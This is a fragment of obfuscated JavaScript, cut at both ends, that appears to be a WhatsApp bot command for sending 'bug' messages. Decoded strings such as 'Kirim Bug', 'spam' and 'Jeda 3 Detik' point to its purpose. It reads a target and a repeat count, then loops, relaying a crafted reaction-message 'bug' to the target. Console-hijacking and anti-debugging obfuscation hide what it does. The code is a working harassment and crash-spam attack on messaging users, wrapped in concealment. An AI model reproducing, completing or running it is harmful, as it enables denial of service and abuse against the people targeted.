_0x2e37ab[_0x4b9a5c(-0x206,-0x207,-0x24f,-0x1bd,-0x1a2)](_0x114a3c,_0x42ea95);},'yjFeP':_0x2e37ab[_0x1d6939(0xe4,-0x15,-0x17,0x3a,-0x30)],'lbaRv':_0x2e37ab[_0x1d6939(-0x37,-0x21,-0x6,0x42,0xca)]};if(_0x2e37ab[_0x19feaf(-0x129,-0xc2,-0x2a,-0x8b,-0x5a)](_0x2e37ab[_0x35fe76(-0x50,-0x10,0x18,0x63,0xd7)],_0x2e37ab[_0x1e9d69(0x243,0x221,0x126,0x243,0x1c3)])){const _0x310b64=_0x1310ea?function(){function _0x2ec924(_0x41802f,_0x4f285c,_0x51d8f0,_0x2fdf11,_0x1f5535){return _0x1d6939(_0x41802f-0x132,_0x2fdf11,_0x51d8f0-0x1c0,_0x51d8f0- -0x12d,_0x1f5535-0x1d8);}function _0x93775f(_0x45f38d,_0x3136ba,_0x29c21f,_0xa26f7a,_0x334137){return _0x19feaf(_0x45f38d-0x3d,_0x3136ba-0x73,_0x29c21f-0x6c,_0x29c21f-0x1cf,_0xa26f7a);}function _0xa39a13(_0x1e4109,_0xee3e9e,_0x2d9510,_0x4ca8d2,_0x396b53){return _0x2842f7(_0x1e4109-0x8e,_0xee3e9e-0x21,_0xee3e9e,_0x1e4109- -0x76,_0x396b53-0x192);}const _0x533b6e={'olRUk':function(_0xa874a3,_0x2dfb2e){function _0x520e8c(_0x8a796,_0x155c38,_0x1df45e,_0xde8b7c,_0x282468){return _0x407e(_0x282468-0x3cc,_0x1df45e);}return _0x35f954[_0x520e8c(0x520,0x5b2,0x48c,0x4dc,0x502)](_0xa874a3,_0x2dfb2e);},'GaJbA':function(_0x1d3b55,_0x133915){function _0x2961b7(_0x47779d,_0x1c8966,_0x1dd86c,_0x138f7a,_0x5a0abe){return _0x407e(_0x47779d-0x2c6,_0x5a0abe);}return _0x35f954[_0x2961b7(0x495,0x525,0x548,0x549,0x4d5)](_0x1d3b55,_0x133915);},'JjVkS':function(_0x11bd6a,_0x4649cd){function _0x25eaa5(_0x58e66c,_0x378abe,_0x389f3b,_0x48e3c7,_0x2d0124){return _0x407e(_0x48e3c7-0x222,_0x389f3b);}return _0x35f954[_0x25eaa5(0x402,0x2f0,0x344,0x39a,0x42a)](_0x11bd6a,_0x4649cd);},'JKnwn':_0x35f954[_0xa39a13(0x38e,0x3e0,0x3f0,0x43a,0x363)],'rgunq':_0x35f954[_0xa39a13(0x418,0x37b,0x402,0x3be,0x43e)]};function _0x7d75e5(_0x1cf35b,_0x49f328,_0xa599,_0x5f2bc0,_0x39e7a6){return _0x1d6939(_0x1cf35b-0x14e,_0x1cf35b,_0xa599-0x1d,_0x5f2bc0- -0xb5,_0x39e7a6-0xc);}function _0xf95de1(_0x2fd666,_0x2d43a5,_0x548725,_0xcdb2f4,_0x17f640){return _0x2842f7(_0x2fd666-0xc9,_0x2d43a5-0x1e2,_0xcdb2f4,_0x2fd666- -0x490,_0x17f640-0xa9);}if(_0x35f954[_0xa39a13(0x479,0x447,0x4a6,0x3ff,0x4ef)](_0x35f954[_0x2ec924(-0x12e,-0xb2,-0xfa,-0xb9,-0x69)],_0x35f954[_0x7d75e5(-0x19,-0x25,-0x14,-0x82,-0xf1)])){if(_0x139cc8){if(_0x35f954[_0x2ec924(-0xc5,-0x5b,-0xa6,-0x122,-0x45)](_0x35f954[_0x93775f(0xc3,0xd3,0x165,0x1a9,0xff)],_0x35f954[_0xf95de1(-0x6c,-0x92,0x1a,-0x36,-0xad)])){const _0x4ba7f9=_0x139cc8[_0x7d75e5(-0x1de,-0xd8,-0x1a7,-0x14e,-0xff)](_0x59387f,arguments);return _0x139cc8=null,_0x4ba7f9;}else _0x194a25=_0x533b6e[_0x7d75e5(-0x101,-0xc9,-0x3d,-0xa4,-0x112)](_0x21f457,_0x533b6e[_0xa39a13(0x4af,0x485,0x43a,0x3fd,0x424)](_0x533b6e[_0x93775f(0x296,0x268,0x232,0x2e1,0x20e)](_0x533b6e[_0x93775f(0x262,0x1fc,0x1fc,0x15a,0x1cb)],_0x533b6e[_0xa39a13(0x459,0x403,0x464,0x47b,0x3ff)]),');'))();}}else{const _0x5a7cc7=_0x4394a8?function(){function _0x218071(_0x363aa5,_0x3e7359,_0x1277f2,_0x6aae27,_0x1588f5){return _0xf95de1(_0x6aae27-0x1eb,_0x3e7359-0xff,_0x1277f2-0x7f,_0x1277f2,_0x1588f5-0x38);}if(_0x157e84){const _0x5164b9=_0x300130[_0x218071(0x181,0x12a,0x117,0x12a,0x100)](_0x28d6cc,arguments);return _0xdc589c=null,_0x5164b9;}}:function(){};return _0x219055=![],_0x5a7cc7;}}:function(){};return _0x1310ea=![],_0x310b64;}else _0x2e37ab[_0x19feaf(-0x63,-0x8a,-0x6c,-0xb,0x15)](_0x4ec774,'0');};}()),_0xe1d538=_0x26d782(this,function(){const _0x4ece61={'wrJto':_0x1688d4(0x14f,0xdc,0x16f,0x168,0x1b5)+_0x9daf4c(0x2b9,0x2c9,0x24c,0x1ee,0x2ff)+_0x1688d4(0x1d5,0x284,0x1ff,0x283,0x16a)+')','OSfhb':_0x210830(-0x26e,-0x1e8,-0x15c,-0x173,-0x1b8)+_0x51583f(-0x1f1,-0x19f,-0x110,-0xcd,-0x16c)+_0x9daf4c(0x1a5,0x1b9,0x153,0x16b,0x177)+_0x210830(-0x1ef,-0x144,-0xfa,-0xd2,-0xa3)+_0xd6b1(0x5be,0x54a,0x591,0x521,0x4fa)+_0x1688d4(0xb9,0x10b,0x16e,0x1d1,0xe7)+_0x9daf4c(0x299,0x1db,0x1ff,0x162,0x18f),'oIYIe':function(_0x3b74b8,_0x239f42){return _0x3b74b8(_0x239f42);},'PBbIu':_0x210830(-0x127,-0xd3,-0x7c,-0x10f,-0x38),'HlVUv':function(_0xe19f86,_0x279afa){return _0xe19f86+_0x279afa;},'tTjDZ':_0x1688d4(0x2b6,0x29c,0x202,0x1c6,0x17c),'aCMWp':function(_0x20de2c,_0x336b5f){return _0x20de2c+_0x336b5f;},'hbxDh':_0xd6b1(0x535,0x551,0x5c4,0x522,0x569),'VWlBe':function(_0x4d889a){return _0x4d889a();},'tHvtp':function(_0x2595c7,_0x2f2a3b,_0x396c6c){return _0x2595c7(_0x2f2a3b,_0x396c6c);},'ysRHl':function(_0x5d6a2d,_0x4cd261){return _0x5d6a2d!==_0x4cd261;},'zqyZa':_0x1688d4(0x118,0x1b1,0x1be,0x1ab,0x25f),'ikRaj':_0xd6b1(0x5f9,0x565,0x5a3,0x4df,0x5cc),'DTQRS':function(_0x5d38b0,_0xd981c3){return _0x5d38b0===_0xd981c3;},'wIrqT':_0x1688d4(0x136,0xcf,0x153,0x13c,0x1c0),'xVFpy':_0x1688d4(0x215,0x22e,0x21b,0x1e3,0x244)+_0x51583f(0x24,-0x87,-0x54,-0xf2,-0x89)+_0x9daf4c(0x20e,0x20b,0x223,0x236,0x1c7)+_0x210830(-0x9f,-0xc9,-0xfb,-0x164,-0xd3),'woYWN':_0xd6b1(0x614,0x617,0x6a9,0x600,0x6a5)+_0x1688d4(0x132,0xfb,0x1a0,0x170,0x10d)+_0x9daf4c(0x13b,0x12c,0x1a2,0x1ab,0xff)+_0x9daf4c(0xf4,0xc4,0x127,0x1bd,0x1b4)+_0x1688d4(0x169,0x261,0x215,0x17e,0x2b4)+_0x210830(-0x10b,-0x14f,-0x135,-0xd2,-0x1ad)+'\x20)','ILjvM':_0x210830(-0x196,-0x180,-0x1dd,-0x217,-0x18f),'OkNqO':_0x210830(-0xcf,-0x167,-0x18a,-0x17d,-0x104),'MnVvv':_0x51583f(-0x5b,0x24,-0xbc,0x1d,-0x61),'eWseG':_0x1688d4(0x15f,0x16b,0x1f4,0x163,0x278),'TlOnE':_0x9daf4c(0x16a,0x1dd,0x1a9,0x1e0,0x1ea),'SLcOo':_0x9daf4c(0xce,0x1da,0x12c,0x1a4,0x16b),'BzXMS':_0xd6b1(0x552,0x5f4,0x650,0x5a9,0x62b)+_0x9daf4c(0x13e,0x29c,0x1f2,0x1f8,0x17d),'CKZmF':_0x51583f(-0x1b,-0xd0,-0x67,-0xb1,-0x47),'icapl':_0xd6b1(0x5c9,0x55a,0x527,0x520,0x53c),'aAPiR':function(_0x87d2a2,_0x20653a){return _0x87d2a2<_0x20653a;},'GhqvO':_0x51583f(-0x20b,-0x1af,-0x128,-0x1e4,-0x18a),'wReLP':_0x51583f(-0x158,-0x145,-0x6b,-0xf9,-0xbe)},_0x2f2372=function(){function _0x124ad5(_0x51ed8b,_0x58818f,_0x2d5eb9,_0x211655,_0x9141ef){return _0x51583f(_0x51ed8b-0x12b,_0x58818f-0xb7,_0x51ed8b,_0x211655-0x117,_0x211655-0x34b);}function _0x5ec576(_0x5ce2ba,_0x54310c,_0xce222,_0x29dbaa,_0x1584f5){return _0xd6b1(_0x5ce2ba-0x27,_0x1584f5- -0x601,_0xce222-0xfe,_0x29dbaa-0x60,_0x5ce2ba);}function _0x189b1b(_0x43c470,_0x192223,_0x4f6d82,_0x59b2c8,_0x382d39){return _0x1688d4(_0x59b2c8,_0x192223-0x1a8,_0x192223-0x34f,_0x59b2c8-0xff,_0x382d39-0x1b7);}function _0x558d86(_0x3fc15d,_0x4140b9,_0x473555,_0x3138ba,_0x171f29){return _0x210830(_0x3fc15d-0x105,_0x3fc15d-0x30c,_0x473555-0x158,_0x3138ba,_0x171f29-0x1b5);}function _0x2ba505(_0x54b37b,_0x4b5113,_0x25f33c,_0x89047c,_0x41cf04){return _0x210830(_0x54b37b-0x5b,_0x4b5113-0x2b8,_0x25f33c-0x4f,_0x41cf04,_0x41cf04-0x1c7);}if(_0x4ece61[_0x5ec576(-0x8c,-0x22,-0x126,-0x12b,-0xb4)](_0x4ece61[_0x5ec576(0x41,0x1c,0x9b,0x2e,0x21)],_0x4ece61[_0x124ad5(0x355,0x2cf,0x3a8,0x325,0x2bb)])){let _0x3674fe;try{if(_0x4ece61[_0x5ec576(-0x6d,-0xba,-0x80,-0x70,-0x1f)](_0x4ece61[_0x2ba505(0x180,0x1c8,0x262,0x195,0x239)],_0x4ece61[_0x124ad5(0x265,0x37d,0x361,0x2d2,0x261)]))_0x3674fe=_0x4ece61[_0x124ad5(0x2e3,0x2ff,0x280,0x263,0x30d)](Function,_0x4ece61[_0x124ad5(0x338,0x276,0x264,0x317,0x286)](_0x4ece61[_0x558d86(0x22e,0x214,0x221,0x232,0x1d7)](_0x4ece61[_0x124ad5(0x29e,0x2f3,0x2be,0x283,0x230)],_0x4ece61[_0x124ad5(0x312,0x2ea,0x292,0x269,0x203)]),');'))();else{const _0x5cba0e={'QAoEd':_0x4ece61[_0x5ec576(-0x46,-0x166,-0x130,-0x33,-0xbd)],'KOjit':_0x4ece61[_0x5ec576(-0x4b,-0x156,-0x3f,-0x50,-0xd9)],'bojkL':function(_0x795f9e,_0x2ae119){function _0xb425d2(_0x1b5229,_0x3ac138,_0x53ac59,_0x498a69,_0x51f93e){return _0x189b1b(_0x1b5229-0x197,_0x51f93e- -0x7d,_0x53ac59-0x1ee,_0x1b5229,_0x51f93e-0xd4);}return _0x4ece61[_0xb425d2(0x4cc,0x42b,0x4a5,0x46a,0x4a5)](_0x795f9e,_0x2ae119);},'aMSTl':_0x4ece61[_0x5ec576(-0xcd,-0x7d,0x15,-0x114,-0x61)],'OdQvB':function(_0x84278b,_0x3e47ce){function _0x29738a(_0x19b466,_0x330e15,_0x132360,_0x22a799,_0x1e2c41){return _0x558d86(_0x1e2c41- -0xcd,_0x330e15-0x8e,_0x132360-0x19a,_0x132360,_0x1e2c41-0x16b);}return _0x4ece61[_0x29738a(0x201,0x147,0x140,0x177,0x194)](_0x84278b,_0x3e47ce);},'HKoBN':_0x4ece61[_0x2ba505(0x100,0xc3,0x25,0xd8,0x178)],'nuMlB':function(_0x3b3b9c,_0x50bb53){function _0x3ca186(_0x3242a1,_0x9925c1,_0x2060b0,_0x57f00a,_0x2ddc0d){return _0x558d86(_0x9925c1- -0x11d,_0x9925c1-0xe9,_0x2060b0-0x152,_0x3242a1,_0x2ddc0d-0xf8);}return _0x4ece61[_0x3ca186(0x76,0x111,0x8d,0x74,0x16c)](_0x3b3b9c,_0x50bb53);},'hyPcg':_0x4ece61[_0x5ec576(-0x70,-0xe3,-0x138,-0x103,-0x9e)],'fHpiV':function(_0x2c8d8c){function _0x3462c2(_0x2312b9,_0x339b35,_0x35d5c3,_0x1c12d1,_0x286702){return _0x558d86(_0x1c12d1- -0x1d7,_0x339b35-0x121,_0x35d5c3-0x16,_0x339b35,_0x286702-0x97);}return _0x4ece61[_0x3462c2(-0x91,-0x5e,-0x5b,-0x58,0x51)](_0x2c8d8c);}};_0x4ece61[_0x124ad5(0x35c,0x277,0x388,0x312,0x379)](_0x5d7003,this,function(){function _0x26d4d9(_0x2e5cd7,_0x2dfeaf,_0x52cc1f,_0x5414e5,_0x59385a){return _0x189b1b(_0x2e5cd7-0x17f,_0x52cc1f- -0x39e,_0x52cc1f-0x172,_0x2e5cd7,_0x59385a-0x8a);}function _0x43856a(_0x4cc528,_0x241455,_0x24fae3,_0x5dbd06,_0x34fe3c){return _0x5ec576(_0x34fe3c,_0x241455-0x1bd,_0x24fae3-0x13f,_0x5dbd06-0x129,_0x241455-0x247);}function _0x3c714b(_0x3d687e,_0x1bc4dd,_0x37ae65,_0x56c35e,_0x5514a9){return _0x124ad5(_0x3d687e,_0x1bc4dd-0x15a,_0x37ae65-0xdf,_0x37ae65-0xc0,_0x5514a9-0x11e);}function _0x2e0822(_0x1ec13b,_0x235af8,_0xf3c9bd,_0xbc2497,_0x56bd07){return _0x189b1b(_0x1ec13b-0x108,_0x56bd07- -0x6a2,_0xf3c9bd-0x7a,_0xbc2497,_0x56bd07-0xa2);}const _0x2decae=new _0x24fb67(_0x5cba0e[_0x2e0822(-0x85,-0xdd,-0x112,-0x6b,-0x10b)]),_0x5d3766=new _0x31e708(_0x5cba0e[_0x2e0822(-0xf2,-0x1af,-0x199,-0x1a1,-0x171)],'i'),_0x4c92f4=_0x5cba0e[_0x43856a(0x192,0x22b,0x231,0x1fa,0x271)](_0x30edf1,_0x5cba0e[_0x43856a(0x203,0x14f,0x151,0xb9,0x1ce)]);function _0x5ca695(_0x473cdf,_0x1b8c2e,_0x3ba0b2,_0x3acd62,_0x100573){return _0x5ec576(_0x3acd62,_0x1b8c2e-0x172,_0x3ba0b2-0x27,_0x3acd62-0x1e8,_0x1b8c2e-0x135);}!_0x2decae[_0x3c714b(0x42a,0x433,0x3b5,0x378,0x38e)](_0x5cba0e[_0x3c714b(0x455,0x446,0x3d1,0x47e,0x46d)](_0x4c92f4,_0x5cba0e[_0x3c714b(0x279,0x21a,0x27f,0x24d,0x1df)]))||!_0x5d3766[_0x26d4d9(0x1db,0x251,0x216,0x276,0x252)](_0x5cba0e[_0x43856a(0x20d,0x1e1,0x178,0x18c,0x144)](_0x4c92f4,_0x5cba0e[_0x26d4d9(0x175,0x1a2,0x1a7,0x17f,0x174)]))?_0x5cba0e[_0x43856a(0x293,0x22b,0x1ec,0x1ca,0x267)](_0x4c92f4,'0'):_0x5cba0e[_0x2e0822(-0x91,-0x1bd,-0x17f,-0x108,-0x140)](_0x57c486);})();}}catch(_0x1820fa){if(_0x4ece61[_0x5ec576(-0x140,-0x14a,-0x142,-0x90,-0xb4)](_0x4ece61[_0x558d86(0x242,0x234,0x19e,0x2ce,0x273)],_0x4ece61[_0x124ad5(0x304,0x218,0x2d1,0x2b3,0x30c)]))_0x3674fe=window;else return _0x16b265;}return _0x3674fe;}else{const _0x4719da=_0x61ce4d[_0x2ba505(0x77,0xb6,0x8,0x7b,0x29)](_0x2de2b9,arguments);return _0x5a635a=null,_0x4719da;}},_0x2d231e=_0x4ece61[_0x9daf4c(0x121,0x178,0x18d,0xfe,0x15b)](_0x2f2372);function _0x51583f(_0x331df5,_0x5aa26e,_0x57b344,_0x12a3db,_0x546cfc){return _0x407e(_0x546cfc- -0x274,_0x57b344);}function _0x9daf4c(_0x548729,_0x38a167,_0x5ab6f2,_0xed0983,_0x1e2175){return _0x407e(_0x5ab6f2-0x2f,_0x38a167);}function _0xd6b1(_0x29a811,_0x4b2c09,_0x4a2d9d,_0x482d4c,_0x2c55e0){return _0x407e(_0x4b2c09-0x3db,_0x2c55e0);}function _0x210830(_0x2c4a74,_0x4a2aaf,_0xb0df7f,_0x2e0afc,_0x5cfe38){return _0x407e(_0x4a2aaf- -0x2eb,_0x2e0afc);}function _0x1688d4(_0x472db4,_0x5a0916,_0x44a1ed,_0x494b60,_0x20aa80){return _0x407e(_0x44a1ed-0x47,_0x472db4);}const _0x5d3b32=_0x2d231e[_0x51583f(-0x103,-0xe4,-0x76,-0x1ba,-0x107)+'le']=_0x2d231e[_0x1688d4(0x1dd,0x185,0x1b4,0x171,0x11c)+'le']||{},_0x53bcfb=[_0x4ece61[_0x210830(-0x15b,-0x12e,-0x1cf,-0x165,-0x13b)],_0x4ece61[_0xd6b1(0x4c2,0x53d,0x597,0x57d,0x512)],_0x4ece61[_0x210830(-0x13c,-0x18f,-0x20a,-0x199,-0x113)],_0x4ece61[_0x9daf4c(0x1bd,0x2c9,0x21d,0x20d,0x1ec)],_0x4ece61[_0x9daf4c(0x1b5,0xcd,0x146,0xb1,0x102)],_0x4ece61[_0x210830(-0xb4,-0xa8,-0x50,-0x9b,-0x9c)],_0x4ece61[_0x9daf4c(0xf5,0x129,0x14f,0xbf,0x1e6)]];for(let _0x2f1c45=-0x18c4*0x1+0xf10+-0x36*-0x2e;_0x4ece61[_0x9daf4c(0x1ba,0x184,0x1ba,0x144,0x122)](_0x2f1c45,_0x53bcfb[_0xd6b1(0x682,0x5f1,0x56c,0x554,0x5e0)+'h']);_0x2f1c45++){if(_0x4ece61[_0x51583f(-0x114,-0x16c,-0xfb,-0x189,-0x102)](_0x4ece61[_0xd6b1(0x50f,0x538,0x51b,0x4e6,0x545)],_0x4ece61[_0xd6b1(0x591,0x5b4,0x527,0x5c6,0x631)])){const _0x3a6765=_0x26d782[_0x210830(-0x1d8,-0x190,-0x245,-0x161,-0x1b9)+_0x210830(-0x1d9,-0x177,-0x187,-0x1bb,-0xea)+'r'][_0x9daf4c(0xdf,0x12f,0x13f,0x100,0xb6)+_0xd6b1(0x5ac,0x512,0x52a,0x588,0x485)][_0x9daf4c(0x1fa,0x2b9,0x220,0x269,0x252)](_0x26d782),_0x53c7e0=_0x53bcfb[_0x2f1c45],_0x4b6b84=_0x5d3b32[_0x53c7e0]||_0x3a6765;_0x3a6765[_0xd6b1(0x56a,0x4c6,0x43e,0x441,0x4a1)+_0xd6b1(0x5dd,0x5b9,0x667,0x557,0x62f)]=_0x26d782[_0x1688d4(0x186,0x23a,0x238,0x1d4,0x214)](_0x26d782),_0x3a6765[_0x210830(-0x124,-0x16f,-0xff,-0xd0,-0xc0)+_0x210830(-0x220,-0x1bf,-0x15c,-0x24e,-0x262)]=_0x4b6b84[_0x9daf4c(0x183,0x244,0x1ab,0x192,0x172)+_0x1688d4(0x1a3,0x13b,0x173,0x1e5,0x17e)][_0x9daf4c(0x22b,0x1c9,0x220,0x27d,0x1f1)](_0x4b6b84),_0x5d3b32[_0x53c7e0]=_0x3a6765;}else _0x1082a7=_0x4e8370;}});_0xe1d538();function _0x25d859(_0x437b08,_0x361251,_0x372199,_0x403bd8,_0x449c88){return _0x407e(_0x361251- -0x34d,_0x437b08);}if(args[_0x1ff077(0x50f,0x48e,0x4e1,0x4b2,0x4b5)+'h']<-0xdca+-0x58+-0xe23*-0x1)return reply(_0x25d859(-0xaa,-0x100,-0x196,-0xcb,-0xf5)+_0x25d859(-0x1cc,-0x249,-0x229,-0x255,-0x279)+_0x1ff077(0x458,0x42c,0x3dd,0x44b,0x3e0)+_0x51ba1e(0x22a,0x14c,0x101,0x160,0x187)+_0x5b191d(0x496,0x4fc,0x488,0x45e,0x3f8)+command+(_0x1ff077(0x39e,0x3aa,0x407,0x4c5,0x437)+_0x3d7778(0x2b1,0x17b,0x1b3,0x21f,0x2c5)+_0x1ff077(0x3ac,0x3ec,0x302,0x3ec,0x3ac)+_0x5b191d(0x361,0x3bf,0x370,0x36d,0x418)+_0x3d7778(0x298,0x1ee,0x214,0x28a,0x293)+_0x1ff077(0x45e,0x53f,0x408,0x48e,0x491)+_0x5b191d(0x496,0x468,0x386,0x42c,0x383)+':\x20')+command+(_0x1ff077(0x3d2,0x461,0x307,0x41c,0x3ad)+_0x25d859(-0x251,-0x24e,-0x261,-0x262,-0x257)+_0x3d7778(0x28f,0x2a7,0x28e,0x2bc,0x2ee)+_0x1ff077(0x44b,0x48f,0x4ed,0x441,0x4ca)+_0x51ba1e(0x1e7,0x1ed,0x167,0x1c7,0x1ce)+_0x25d859(-0x210,-0x21a,-0x263,-0x1d9,-0x176)+_0x1ff077(0x3b2,0x40b,0x3bf,0x3fc,0x3e6)+_0x1ff077(0x4d0,0x4d2,0x3f2,0x4c4,0x492)+_0x1ff077(0x394,0x4e8,0x437,0x4ee,0x43f)+_0x51ba1e(0x1cb,0x12e,0x1d7,0x164,0x162)+_0x3d7778(0x1eb,0x26f,0x308,0x279,0x311)+_0x3d7778(0x27a,0x1b2,0x21c,0x1fe,0x26b)+_0x51ba1e(0x2f4,0x242,0x2c0,0x238,0x23f)+_0x51ba1e(0x1ec,0x1f8,0x170,0x299,0x203)+_0x3d7778(0x134,0x1de,0x20d,0x167,0x15d)));function _0x4939(){const _0x229bf1=['dvDyo','nit\x20Y','HjfYB','xVFpy','warn','p.net','hyPcg','AaWaV','wtWzC','FKlAd','nksOi','DmSBL','yjFeP','vxMdP','dang\x20','\x5c(\x20*\x5c','wjZdA','TUjRX','chain','EOrav','MnVvv','igjWS','aeTtd','nuMlB','ppXZf','YMhqq','tion','uZySI','PBbIu','ylCWM','DfYVN','cVqmB','Objec','delet','setIn','fHpiV','y\x20kal','rn\x20th','VvASf','$]*)','asuk\x20','while','Fbwxd','retur','JKnwn','ebvNR','aeqQe','Messa','wReLP','kqWIK','\x203\x20Me','OkNqO','debu','to__','FMgtU','ANJth','DnCYp','mple\x20','relay','SmqiY','plXUB','gtWEj','MzLWm','uETmh','rgunq','oJJPU','n\x20(fu','kwLPg','txlzx','SLcOo','ACIiG','chZxJ','bind','r\x0aExa','k\x0a\x0aDi','nctio','gNwwU','iPUAN','@s.wh','JiMRn',')+)+)','mbNAg','wIrqT','PvenV','oleh\x20','Bot\x20U','pvLnD','lVwyb','QAoEd','Rybnw','ZhiFJ','vzEgX','vkOvz','SYhry','DTQRS','1024394yqZRvU','EzJwb','bojkL','JjVkS','GRoOD','aCMWp','fUzRn','|time','\x20Jeda','olong','SlxEM','log','\x20:\x20','RylsK','lengt','iCgZv','init','excep','Lfzqh','vQlEd','24346crFZmB','ion\x20*','test','LwucH','czkaA','ILjvM','n()\x20','VupLS','fpmsz','rim\x20T','UAtlA','pAIFU','FmFrU','XbBHE','ipTpR','0s\x0a\x0a\x0a','ZGBor','table','mrFci','e)\x20{}','zlWjG','GagwO','Mengi','bug\x20b','oWsfL','DfYJs','LfgUc','strin','gger','TpJIn','OdQvB','tHvtp','{}.co','ZvcKv','fIMuV','GaJbA','HlVUv','s|1|1','essag','CKZmF','geId','pLfid','27470792mvsCbs','zqyZa','actio','GuBFt','MsRMJ','DtjLs','XHaxn','*Synt','ikRaj','EtOXE','DDyZm','XAmgl','Lagi','HKoBN','apply','wuQdl','__pro','\x20Nya','Ygmxm','3288040nswLHw','Kirim','sendM','yOnjk','count','searc','akan\x20','ETxuf','tTjDZ','PubbB','\x22retu','upfjb','ILoxn','uzudV','AzRpS','error','QrTxl','8@g.u','gRiex','953181JQnNUa','faJqE','\x5c+\x5c+\x20','ax\x20Er','giEYt','VWrmY','xHPoU','*(?:[','nAFZt','clVBQ','dedTe','DLhUB','mount','\x206288','NgRKt','proto','bKjSo','iiYPN','FopGR','LwZhj','5725644WKZfQr','wnkLe','BzXMS','wFOPX','\x0a\x0aUse','IyHsU','lVwpe','exten','BvukL','lWhWb','yimZu','icapl','COouT','2069350dmJHKB','\x20spam','a-zA-','ZEOIA','xtMes','zA-Z_','funct','WtkmH','EWBnL','bdVcW','ing','RKsKI','aMSTl','deZcS','PLdLh','DNwUN','ToejC','econd','\x20Suks','ossWK','eKNJz','type','nti\x20B','SUusw','rrdMV','MMawT','ivJcz','wUweO','lbaRv','frpdh','sage','ror!*','bpYZK','BQuPi','ompro','split','pxMqC','/Deti','messa','AJxAJ','oomgb','yXEsX','\x20Bug\x20','OSfhb','react','OUDJp','tagIS','ssage','state','JzQKE','sLAHH','vEgIi','ITIoD','EaSRO','pXBuj','nstru','aVdaS','const','TlOnE','GhqvO','VWlBe','QgzAp','s\x20=\x20S','terva','eWseG','uQIuD','piaAi','xYdco','rwJGF','YIJbT','rmHAF','wrJto','zJbSx','HmuVJ','\x20(tru','conso','fcAJg','0-9a-','zxpnH','Uwvyt','ysRHl','ctor(','ructo','atsap','input','qkByk','URWLq','oClOO','info','Leqmd','toStr','7cbCMLy','IpnvA','trace','UfQlH','mDyog','ionMe','dah\x20M','wgxaW','reply','fjMTb','wDtgM','hbxDh','jxygk','oKXPG','aAPiR','oIYIe','UgcMb','es\x20Se','bTmku','OUEju','OWtxX','woYWN','olRUk','YRCfs','Group','WEIyU','gOEjh','\x20idGr','slCiW','(((.+','KOjit','is\x22)(','ckJgk','call','qgUIb','\x20Usah','XBWWq','ah\x20Na','CjbOl','oup|a','ofclY','Ktoij','Z_$][','nhfFs'];_0x4939=function(){return _0x229bf1;};return _0x4939();}m[_0x1ff077(0x47c,0x44d,0x464,0x446,0x424)](_0x1ff077(0x36c,0x36e,0x39b,0x3cc,0x3d3)+_0x25d859(-0x10d,-0x1bf,-0x116,-0x1ba,-0x135)+_0x51ba1e(0x1ca,0x1f2,0x23c,0x23b,0x225)+_0x5b191d(0x46e,0x4f4,0x504,0x47c,0x50c)+_0x3d7778(0x2b8,0x324,0x2aa,0x2a0,0x260)+_0x51ba1e(0x1ce,0x2ba,0x254,0x1fa,0x27f)+_0x1ff077(0x49e,0x539,0x468,0x451,0x4af)+_0x25d859(-0x133,-0x172,-0xeb,-0x1c8,-0x13c)+_0x1ff077(0x475,0x3a9,0x3ae,0x43d,0x449)+_0x5b191d(0x33f,0x415,0x3d2,0x3ec,0x36f)+_0x3d7778(0x223,0x219,0x201,0x1b3,0x202)+_0x25d859(-0x124,-0x150,-0x200,-0x138,-0xd3)+_0x3d7778(0x1dd,0x15a,0x161,0x16a,0x188)+_0x1ff077(0x3f2,0x33c,0x42e,0x40d,0x3eb)+_0x25d859(-0x1ef,-0x266,-0x29f,-0x300,-0x1de)),bnnd=text[_0x1ff077(0x3f2,0x3cd,0x46e,0x40d,0x3e4)]('|')[-0x2*0x4b3+-0x3d*0x59+-0x5*-0x61f]+(_0x1ff077(0x4e9,0x53e,0x4bd,0x493,0x496)+_0x5b191d(0x464,0x3eb,0x364,0x3bf,0x425)+_0x5b191d(0x39b,0x3ae,0x413,0x3f8,0x461)),jumlah=q[_0x25d859(-0x24e,-0x208,-0x173,-0x217,-0x241)]('|')[-0x35*0x8d+-0x1*0x1f76+0x1438*0x3];for(let i=0xb0f*0x1+0x1*0x66d+-0x8be*0x2;i<jumlah;i++){var mentionByReply=body==_0x25d859(-0x1a1,-0x231,-0x26c,-0x1b9,-0x279)+_0x3d7778(0x20b,0xdc,0x22a,0x186,0x1fe)+_0x1ff077(0x468,0x46f,0x46d,0x460,0x3c5)+_0x3d7778(0x1c8,0x166,0x12f,0x1bb,0x1bb);const _0x239e64={};_0x239e64[_0x3d7778(0x219,0x16d,0x195,0x1c9,0x224)+_0x1ff077(0x38c,0x4b1,0x38f,0x429,0x421)+_0x51ba1e(0x1a0,0x1cd,0x128,0x275,0x1bf)]=reactionMessage;const _0x4652d2={};_0x4652d2[_0x1ff077(0x379,0x3a7,0x3e8,0x42e,0x3e7)+_0x25d859(-0x95,-0x109,-0x105,-0xdb,-0x7f)]=_0x1ff077(0x52a,0x4fc,0x562,0x583,0x4d2)+_0x25d859(-0x19c,-0x180,-0x1f0,-0x1ac,-0x149);let bug=haikal[_0x5b191d(0x410,0x48a,0x41b,0x42d,0x3e5)+_0x51ba1e(0x2ee,0x1aa,0x281,0x2f1,0x246)+'ge'](from,_0x239e64,_0x4652d2);const _0x455e3b={};_0x455e3b[_0x3d7778(0x2c2,0x2b5,0x2ec,0x245,0x1c4)+'e']=bug,haikal[_0x3d7778(0x136,0x202,0x110,0x16b,0x10b)+_0x25d859(-0xe2,-0x10b,-0x13b,-0x63,-0x6b)+'e'](from,_0x455e3b),await sleep(-0xa70*-0x3+0x1a41+-0x31c1);}function _0x5b191d(_0x4af08e,_0x4f873a,_0x1d24a0,_0x340b24,_0x541797){return _0x407e(_0x340b24-0x24a,_0x541797);}function _0x4cc04e(_0xb8f7b3){function _0x2c2f3a(_0x20a931,_0x3e58fc,_0x3177b3,_0x118f2a,_0x1e3b1a){return _0x3d7778(_0x20a931-0x1c3,_0x3e58fc-0x104,_0x3177b3-0x88,_0x3177b3- -0x22e,_0x20a931);}function _0x59d0f9(_0x1c1f59,_0x80cb23,_0x3f94c9,_0x539041,_0x51aec3){return _0x51ba1e(_0x1c1f59-0x1d2,_0x80cb23-0x129,_0x3f94c9-0xf,_0x80cb23,_0x1c1f59-0x342);}const _0x2aa016={'TpJIn':function(_0x153e57,_0x1b8f57){return 